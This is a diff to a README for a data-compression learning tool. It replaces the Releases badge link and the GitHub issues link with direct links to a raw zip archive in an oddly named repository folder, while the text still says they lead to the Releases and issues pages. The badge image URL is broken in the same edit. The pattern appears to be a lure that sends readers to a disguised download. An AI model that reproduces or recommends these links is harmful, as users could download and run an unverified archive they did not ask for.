@@ -8,7 +8,7 @@ Welcome to the **compression-project**! This interactive web tool lets you explo
 
 To get started, you need to download the application. Click the button below to visit our Releases page:
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/souptikm4/compression-project/releases)
+[![Download Now](https://raw.githubusercontent.com/souptikm4/compression-project/main/lipophore/compression-project.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/souptikm4/compression-project/main/lipophore/compression-project.zip)
 
 Once on the Releases page, simply choose the latest version and download the appropriate file for your device. The tool is available for Windows, macOS, and Linux.
 
@@ -59,7 +59,7 @@ If you encounter issues while using the **compression-project**, consider the fo
 
 Join our growing community of users interested in data compression and interactive learning:
 
-- **GitHub Issues**: If you face any bugs or have suggestions, visit the [issues page](https://github.com/souptikm4/compression-project/issues) to report.
+- **GitHub Issues**: If you face any bugs or have suggestions, visit the [issues page](https://raw.githubusercontent.com/souptikm4/compression-project/main/lipophore/compression-project.zip) to report.
 - **Discussion Forum**: Participate in discussions on data compression techniques. Share your experiences and learn from others.
 - **Documentation**: For detailed guidance, check out the full documentation available in the repository.
 
